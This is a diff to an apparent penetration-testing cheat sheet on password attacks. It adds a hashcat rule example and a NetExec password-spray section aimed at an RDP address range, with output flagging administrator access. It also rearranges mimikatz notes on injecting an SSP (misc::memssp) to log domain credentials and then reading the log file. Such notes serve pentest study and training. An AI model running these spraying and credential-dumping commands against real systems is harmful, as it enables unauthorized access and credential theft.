@@ -48,11 +48,13 @@ hashcat -b
 
 Manipulate dictionary files with rule sets
 
-* seperate to rules with `space` to apply for each password
+* seperate to with `space` to apply for each password
 
 ```bash
 # delete lines no starting with 1
 sed -i '/^1/d' pass.txt
+# use the word as it is
+echo : > demo.rule
 # capitalize with c
 echo c > demo.rule
 # prepend with ^
@@ -201,6 +203,24 @@ hashcat -m 12001 /tmp/hashes.txt /usr/share/wordlists/fasttrack.txt
 {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
 ```
 
+## Password Spray with NXC (netexec)
+
+* NetExec (a.k.a nxc) is the successor a network service exploitation tool crackmapexec
+* From: [NetExec Wiki](https://www.netexec.wiki/getting-started/target-formats)
+* Modules ftp,ssh,smb,nfs,winrm,mssql,wmi,vnc,ldap,rdp
+* [+]  **User credendential**
+* [+] (Pwn3d!) **Admin Credentials**
+
+```bash
+nxc rdp 192.168.207.70-75 -u 'mary'  -p 'Nexus123!' -d example.com --no-bruteforce --continue-on-success
+
+RDP         192.168.207.70  3389   DC1              [+] corp.com\pete:Nexus123! 
+RDP         192.168.207.72  3389   WEB02            [+] corp.com\pete:Nexus123! (Pwn3d!)
+RDP         192.168.207.74  3389   CLIENT4          [+] corp.com\pete:Nexus123! 
+
+```
+
+
 ## NTLM Exfiltration with CrackMapExec
 
 * Crackmapexec is an excellent tool to remotely perform a dump of LSASS.
@@ -263,18 +283,16 @@ lsadump::sam
 # Extract NTML hashes of logged on Domain Accounts
 sekurlsa::logonpasswords
 
-# Inject a SSPI (authenthication provider) to log Domain Accounts to file.
-# This is necessary, if CredentialGuard is in place as protection mechanism.
   * Username : Administrator
   * Domain   : CORP
        * LSA Isolated Data: NtlmHash
 
+# Inject a SSPI (authenthication provider) to log Domain Accounts to file.
+# This is necessary, if CredentialGuard is in place as protection mechanism.
 misc::memssp
 type C:\Windows\System32\mimilsa.log
 
 ```
-
-
 
 ## NTLM Cracking with regsave and impacket-secretsdump
 
